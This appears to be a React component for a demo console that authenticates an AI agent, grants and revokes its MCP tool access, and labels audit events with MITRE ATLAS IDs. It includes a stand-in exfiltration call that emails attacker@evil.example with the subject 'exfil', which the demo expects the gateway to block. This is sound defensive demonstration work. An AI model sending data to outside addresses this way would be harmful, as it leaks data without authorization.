import { useCallback, useEffect, useMemo, useState } from "react";
import Layout from "../components/Layout.jsx";
import { api, ApiError } from "../lib/api.js";
import "./Monitoring.css";

const DEMO_AGENT = "agent-comms-01";

export default function Monitoring() {
  const [agents, setAgents] = useState([]);
  const [tools, setTools] = useState([]);
  const [audit, setAudit] = useState([]);
  const [matrix, setMatrix] = useState(null);
  const [token, setToken] = useState(null);
  const [flash, setFlash] = useState(null);
  const [busy, setBusy] = useState(false);
  const [lastResult, setLastResult] = useState(null);
  const [atlasVersion, setAtlasVersion] = useState("");

  const agent = useMemo(
    () => agents.find((a) => a.agent_id === DEMO_AGENT) || agents[0],
    [agents],
  );

  const refresh = useCallback(async () => {
    const [a, t, au, m] = await Promise.all([
      api.agents(),
      api.tools(),
      api.audit(),
      api.matrix(),
    ]);
    setAgents(a);
    setTools(t);
    setAudit(au);
    setMatrix(m);
    setAtlasVersion(m.atlas_version);
  }, []);

  useEffect(() => {
    refresh().catch((e) =>
      setFlash({
        kind: "deny",
        title: "Gateway unreachable",
        body: String(e.message || e),
      }),
    );
    const id = window.setInterval(() => {
      api.audit().then(setAudit).catch(() => {});
      api.agents().then(setAgents).catch(() => {});
    }, 2500);
    return () => window.clearInterval(id);
  }, [refresh]);

  async function authenticate() {
    if (!agent) return;
    setBusy(true);
    try {
      const res = await api.mintAgentToken(agent.agent_id);
      setToken(res.access_token);
      setFlash({
        kind: "ok",
        title: "Agent authenticated",
        body: res.atlas?.narrative || "Workload token issued.",
        mitigation_ids: ["AML.M0028", "AML.M0024"],
      });
      await refresh();
    } catch (e) {
      setFlash({ kind: "deny", title: "Auth failed", body: String(e.message || e) });
    } finally {
      setBusy(false);
    }
  }

  async function runTool(tool, args) {
    if (!token) {
      setFlash({
        kind: "info",
        title: "Authenticate first",
        body: "Issue a workload token before calling tools.",
      });
      return;
    }
    setBusy(true);
    try {
      const res = await api.callTool(token, tool, args);
      setLastResult(res.result);
      setFlash({
        kind: "ok",
        title: `Allowed ${tool}`,
        body: res.atlas?.narrative || "Allowed",
        technique_ids: res.atlas?.technique_ids,
        mitigation_ids: res.atlas?.mitigation_ids,
      });
      await refresh();
    } catch (e) {
      const detail = e instanceof ApiError ? e.data?.detail : null;
      const atlas =
        detail && typeof detail === "object"
          ? detail
          : null;
      setLastResult(detail ?? { error: String(e.message || e) });
      setFlash({
        kind: "deny",
        title: atlas?.message || `Denied ${tool}`,
        body: atlas?.atlas?.narrative || e.message || "Request blocked",
        technique_ids: atlas?.atlas?.technique_ids || atlas?.technique_ids,
        mitigation_ids: atlas?.atlas?.mitigation_ids || atlas?.mitigation_ids,
      });
      await refresh();
    } finally {
      setBusy(false);
    }
  }

  async function revoke(tool) {
    if (!agent) return;
    setBusy(true);
    try {
      const res = await api.revokeTool(agent.agent_id, tool);
      setFlash({
        kind: "info",
        title: `Revoked ${tool}`,
        body: res.message || "Grant revoked.",
        technique_ids: res.atlas?.technique_ids,
        mitigation_ids: res.atlas?.mitigation_ids,
      });
      await refresh();
    } catch (e) {
      setFlash({ kind: "deny", title: "Revoke failed", body: String(e.message || e) });
    } finally {
      setBusy(false);
    }
  }

  async function restore(tool) {
    if (!agent) return;
    setBusy(true);
    try {
      await api.grantTool(agent.agent_id, tool);
      setFlash({
        kind: "ok",
        title: `Restored ${tool}`,
        body: "Grant re-added under AML.M0028.",
        mitigation_ids: ["AML.M0028"],
      });
      await refresh();
    } catch (e) {
      setFlash({ kind: "deny", title: "Restore failed", body: String(e.message || e) });
    } finally {
      setBusy(false);
    }
  }

  return (
    <Layout>
      <div className="monitoring-console">
        <div className="shell">
          <header className="top">
            <div className="brand-block">
              <p className="eyebrow">Prompt 1 · Agentic identity</p>
              <h1>Monitoring</h1>
              <p className="tagline">
                Authenticate an agent, allow MCP tools, revoke mid-task — MITRE ATLAS on every decision.
              </p>
            </div>
            <div className="meta">
              <span className="pill">ATLAS {atlasVersion || "…"}</span>
              <span className={`pill ${token ? "on" : ""}`}>
                {token ? "Token live" : "Unauthenticated"}
              </span>
            </div>
          </header>

          {flash && (
            <div className={`flash flash-${flash.kind}`} role="status">
              <strong>{flash.title}</strong>
              <p>{flash.body}</p>
              <div className="id-row">
                {(flash.technique_ids || []).map((id) => (
                  <code key={id} className="tech">
                    {id}
                  </code>
                ))}
                {(flash.mitigation_ids || []).map((id) => (
                  <code key={id} className="mit">
                    {id}
                  </code>
                ))}
              </div>
            </div>
          )}

          <div className="grid">
            <section className="panel identity">
              <h2>Workload identity</h2>
              {agent ? (
                <>
                  <dl>
                    <div>
                      <dt>Agent</dt>
                      <dd>{agent.name}</dd>
                    </div>
                    <div>
                      <dt>Agency</dt>
                      <dd>{agent.agency}</dd>
                    </div>
                    <div>
                      <dt>ID</dt>
                      <dd>
                        <code>{agent.agent_id}</code>
                      </dd>
                    </div>
                    <div>
                      <dt>Token version</dt>
                      <dd>{agent.token_version}</dd>
                    </div>
                  </dl>
                  <button className="primary" type="button" disabled={busy} onClick={authenticate}>
                    Authenticate agent
                  </button>
                  <h3>Tool grants</h3>
                  <ul className="grants">
                    {tools.map((t) => {
                      const granted = agent.tool_grants.includes(t.name);
                      return (
                        <li key={t.name}>
                          <div>
                            <code>{t.name}</code>
                            <span className={`risk risk-${t.risk_level}`}>{t.risk_level}</span>
                            <p>{t.description}</p>
                            <div className="id-row compact">
                              {(t.atlas_techniques || []).map((id) => (
                                <code key={id} className="tech">
                                  {id}
                                </code>
                              ))}
                            </div>
                          </div>
                          <div className="grant-actions">
                            <span className={granted ? "yes" : "no"}>
                              {granted ? "granted" : "revoked"}
                            </span>
                            {granted ? (
                              <button type="button" disabled={busy} onClick={() => revoke(t.name)}>
                                Revoke
                              </button>
                            ) : (
                              <button type="button" disabled={busy} onClick={() => restore(t.name)}>
                                Restore
                              </button>
                            )}
                          </div>
                        </li>
                      );
                    })}
                  </ul>
                </>
              ) : (
                <p>Loading agent…</p>
              )}
            </section>

            <section className="panel actions">
              <h2>Agent task (MCP calls)</h2>
              <p className="hint">
                Demo path: scrape → datagov → email → revoke <code>email.send</code> → retry (blocked as{" "}
                <code>AML.T0053</code>).
              </p>
              <div className="action-row">
                <button
                  type="button"
                  disabled={busy || !token}
                  onClick={() => runTool("web.scrape", { url: "https://www.usa.gov" })}
                >
                  1. web.scrape
                </button>
                <button
                  type="button"
                  disabled={busy || !token}
                  onClick={() => runTool("datagov.search", { q: "public health" })}
                >
                  2. datagov.search
                </button>
                <button
                  type="button"
                  className="primary"
                  disabled={busy || !token}
                  onClick={() =>
                    runTool("email.send", {
                      to: "constituent@example.gov",
                      subject: "Town hall reminder",
                      body: "Join us Tuesday at City Hall.",
                    })
                  }
                >
                  3. email.send
                </button>
                <button
                  type="button"
                  className="danger"
                  disabled={busy || !agent}
                  onClick={() => revoke("email.send")}
                >
                  4. Revoke email.send
                </button>
                <button
                  type="button"
                  disabled={busy || !token}
                  onClick={() =>
                    runTool("email.send", {
                      to: "attacker@evil.example",
                      subject: "exfil",
                      body: "should be blocked",
                    })
                  }
                >
                  5. Retry email.send
                </button>
              </div>
              <h3>Last tool result</h3>
              <pre className="result">{JSON.stringify(lastResult, null, 2) || "—"}</pre>
            </section>

            <aside className="panel atlas">
              <h2>ATLAS Agentic strip</h2>
              <p className="hint">
                Techniques the control plane is defending; mitigations HomeFront labels in audit.
              </p>
              <h3>Techniques</h3>
              <ul className="matrix-list">
                {(matrix?.techniques || []).map((t) => (
                  <li key={t.id}>
                    <code className="tech">{t.id}</code>
                    <span>{t.name || "—"}</span>
                  </li>
                ))}
              </ul>
              <h3>Mitigations</h3>
              <ul className="matrix-list">
                {(matrix?.mitigations || []).map((m) => (
                  <li key={m.id}>
                    <code className="mit">{m.id}</code>
                    <span>{m.name || "—"}</span>
                  </li>
                ))}
              </ul>
            </aside>

            <section className="panel audit">
              <h2>Audit stream · AML.M0024</h2>
              <ul className="audit-list">
                {audit.map((ev) => (
                  <li key={ev.id} className={`dec-${ev.decision}`}>
                    <div className="audit-head">
                      <span className="decision">{ev.decision}</span>
                      <span>{ev.type}</span>
                      <code>{ev.tool || "—"}</code>
                      <time>{new Date(ev.ts * 1000).toLocaleTimeString()}</time>
                    </div>
                    <p>{ev.atlas?.narrative}</p>
                    <div className="id-row compact">
                      {(ev.atlas?.technique_ids || []).map((id) => (
                        <code key={id} className="tech">
                          {id}
                        </code>
                      ))}
                      {(ev.atlas?.mitigation_ids || []).map((id) => (
                        <code key={id} className="mit">
                          {id}
                        </code>
                      ))}
                    </div>
                  </li>
                ))}
                {audit.length === 0 && <li>No events yet — authenticate to begin.</li>}
              </ul>
            </section>
          </div>
        </div>
      </div>
    </Layout>
  );
}
